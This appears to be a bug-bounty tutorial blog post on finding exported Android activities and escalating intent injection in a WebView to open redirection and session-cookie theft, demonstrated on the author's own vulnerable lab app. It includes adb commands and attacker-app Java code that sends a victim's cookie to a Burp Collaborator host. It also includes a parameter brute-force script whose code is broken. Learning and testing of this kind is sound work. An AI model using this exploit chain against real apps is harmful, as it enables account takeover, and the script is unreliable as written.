---
title: One Approach towards Android Bug Bounty
author: nirajkharel
date: 2025-01-05 14:10:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android]
render_with_liquid: false
---


Last month, I explored bug bounties on Android applications and discovered couple of issues issues related to Exported Activities and Intent Injections. These vulnerabilities were either unreported or reported in a manner that underestimated their impact, often categorising them as low severity or informational.

In this blog, I aim to share insights into one of the methods for identifying such issues and strategies to escalate their impact to High or Critical severity. Please note that this is not the only approach but rather one specific type of vulnerability I focused on during my tests.

<h4>Note: The vulnerable application discussed below is available on my <a href="https://github.com/nirajkharel/IntentInjection">Github Repo.</a></h4>

<br>**So, What is an Exported Activity? Intent Injection? Insecure WebView? Account Takeover?**

I am not going to dive into the basics of what an activity is, but Android applications are designed to be sandboxed, and so are their activities. Unless explicitly exported, activities within a particular application cannot be accessed by other applications on the device.

By default, activities are not exported. However, there are multiple ways an activity can be exported:

By setting **"exported=true"** in the Android Manifest file.
By defining an **\<intent-filter\>**. An activity with an intent filter is exported by default unless explicitly marked with **"exported=false"**.
Most of the time, static analyzers or tools only detect activities explicitly marked as **"exported=true"**, so you might need to manually check for intent filters while reviewing the Android Manifest file.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-1.png"><br>

One approach to identifying exported activities is manual, as described earlier. Another method is by using Drozer.

Observe that two activities are exported in the application.

```bash
dz> run app.activity.info -a com.root3d.intentinjection
Attempting to run shell module
Package: com.root3d.intentinjection
  com.root3d.intentinjection.MainActivity
    Permission: null
  com.root3d.intentinjection.PrivacyPolicy
    Permission: null
```

So what does an exported activity mean? An exported activity means it can be accessed by any other application. Is it vulnerable right now? Maybe, maybe not. However, if you reported this as an issue, it would likely be categorised as either **informative/NA** or **low severity** if you're lucky.

So how can you leverage the impact for this? Navigate to the corresponding activity, on this case, **PrivacyPolicy**.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-2.png"><br>

**Here comes the intent injection to open redirection part. But how?**

As you read about open redirection in mobile applications, it typically refers to a web application or website-based attack or vulnerability. But how can this be possible in a mobile application? This means we need to check if the web URL or web application has been referenced or integrated into the mobile application, often through the almighty **WebView**. Always check if a WebView has been implemented. You can either search for the keyword **webview** or see if it has been initialised, as shown in **highlight-1**.

```java
private WebView webview;

// Or,
webview.loadUrl();
```

Let's skip **highlight-2** and **highlight-3** for now and jump into **highlight-4** and **highlight-6**. In these, you can see that the code checks for an extra string parameter. What does **intent.getStringExtra** mean? It means that when the activity is called or triggered, it looks for any extra parameters or values passed to it, specifically the one named **privacy-url**.

**Highlight-6** shows that it checks if the **privacy-url** is provided when calling the activity, and whether it contains any string characters. If yes, it calls the **webview.loadUrl()** function with **privacy-url** as the parameter. Why does it do this? Does it happen often? While it may not be as simple as shown in the vulnerable application, there are many instances where activities require extra parameters, typically when loading privacy policies, terms and conditions, or OAuth URLs.

So we know that the activity takes an extra parameter and loads the WebView with the URL passed in the intent. Why not try loading an arbitrary URL into it?

**Use the below ADB command:**

But what happens if you directly trigger the activity without passing any extra parameters? It will work as intended and would open the legitimate URL.

```bash
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.PrivacyPolicy
```

Execute the same above command with the extra string as mentioned below and see if you can load arbitrary URL.

```bash
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.PrivacyPolicy --es privacy-url "https://google.com"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-3.png">

Now, you have successfully performed open redirection on the mobile application. But what happens when you submit this issue for your bounty? Not much, because ADB can access any private activity on the mobile application, and you have rooted your device, right?

Example, we do have additional one activity called **com.root3d.intentinjection.HomeActivity** but it has not been exported. Let's try if we can load the arbitrary URL into that activity using adb.

```bash
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.HomeActivity --es blog-url "https://google.com"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-4.png">

Was that vulnerable? May be, you can report it mentioning that the URL validation has not been performed. Will you get the bounties? I would have given you, but they, no. You need to do proper exploitation inorder to make it valid and you cannot exploit this issue until there is something like **Intent Redirection** vulnerability. Intent Redirection on itself is an interesting topic, you can have a blog by [Oversecured here](https://blog.oversecured.com/Android-Access-to-app-protected-components/) 

So never just collect the activity and execute the adb command, see, analyse and then only report if that is exported.

Lets forget this HomeActivity part and focus on the PrivacyPolicy one. So before your andreline rush to submit the report, we need to be able to explain them that any other application would be able to load the URL into their application. Until then our issue would not be applicable as they would not accept the issue if you need a physical access into the device and for adb to be able to execute, you would need.

So, lets develop an android application i.e. attacker application. What does this below code do?

Its a simple application which opens the vulnerable activity and will send an extra intent as **privacy-url** to load **https://google.com** into that activity.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.root3d.intentinjection","com.root3d.intentinjection.PrivacyPolicy");

        intent.putExtra("privacy-url","https://google.com");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        startActivity(intent);
    }

}
```

You can create an empty activity on your Android studion and paste this code. Replace the package name and activity name with the vulnerable one and pass the accepted parameter. You should be able to perform an open redirection to the vulnerable app through this app once executed.

The code block `intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);` might be needed sometime as while executing the attacker application, instead of loading the arbitrary URL into the vulnerable application, sometimes it loads to the current attacker application. So it launches the activity in a new task separate from the current task.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-5.png">  


Until now they would treat this issue as Low or Medium because its just an open redirection. It might be the good idea to report until now if you have no option to login or register into the application. Example if the application needs a valid government document of a particular country. 

If you can log in or register into the application, and if any of the activities are vulnerable to intent injection and open redirection, you can probably exfiltrate the user's session cookie through the vulnerable application. Why? Because it sends a GET request to the arbitrary URL with the session cookie in the request header. Believe me, most applications do this. To prevent the application from sending the session cookie, the URL needs to be loaded using the method **loadUrlWithoutCookies(view, url);**, which is rarely implemented in applications.

So instead of loading the fancy portfolio website into the webview. You can develop the android application as per below to send the session cookie into your controlled domain. For example **Burp Collaborator**.

This code is similar as above but just the modification on the URL.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.root3d.intentinjection","com.root3d.intentinjection.PrivacyPolicy");

        intent.putExtra("privacy-url","https://f1hsbzbz62ixdg783ucnuwu2jtpkda1z.oastify.com");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        startActivity(intent);
    }

}
```

Now the attacker application that you have created can exfiltrate the session cookie and then you can now use that session cookie as a victim user.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/android-bug-6.png">

But do not just end here because you haven't done anything with the session cookie, go through the application source code, identify the API endpoints like for example **/delete/users**, **/update/profile**, **/update/email**, **/api/profile** and try to provide an impact on the Confidentialy, Integrity and Availability as well. Check if you can get the profile details, check if you can modify the user details like email address, mobile numbers, and also check if you can delete the current user by using the session cookie.

**On this way you can show the maximum impact on the application.**

Also, its not always necessary that the paramter like **privacy-url** will be available on the source code. While decompiling the application sometime it references to Strings.xml file. If so, you can check for the parameters on there. And sometimes the strings will be defined on files like **Constants.java**. But if you navigate on to that file, you will file some random characters. One of the option could be doing brute force on the adb command to identify the correct parameter.
Example, most of the time URLs for webview would be referenced by usual parameter like 'url, path, link, redirect, page-url, redirect-url, navigate'. Just prepare the list of the parameters and craft a bruteforce script.

Here is the sample one, but check if it works.
```python
import os
import time

wordlist = "wordlist.txt"

with open(wordlist, "r") as file:
        values = file.readlines()
        os.system('adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.HomeActivity --es "{values}" "https://nirajkharel.com.np"')
```

One random technique that has helped me find the issue is with Flutter based applications. For a Flutter-based application, you cannot view the source code easily. **reFlutter** can be used to reverse engineer some parts of the code, but it only provides the names of the functions and classes unless you dig into the assembly.

Sometimes, executing the data URI directly in the main application for Flutter based apps has helped me perform open redirection. Example:

```bash
adb shell am start -a com.intent.action.VIEW -n com.packagename/activityname -d "https://nirajkharel.com.np"
```

This can be due to improper handling of the data URI through the intent directly without any validation. Check this on the flutter based application once.

Nothing much complicated or in-depth technically, but it might be helpful for those trying to learn. Happy Hacking !!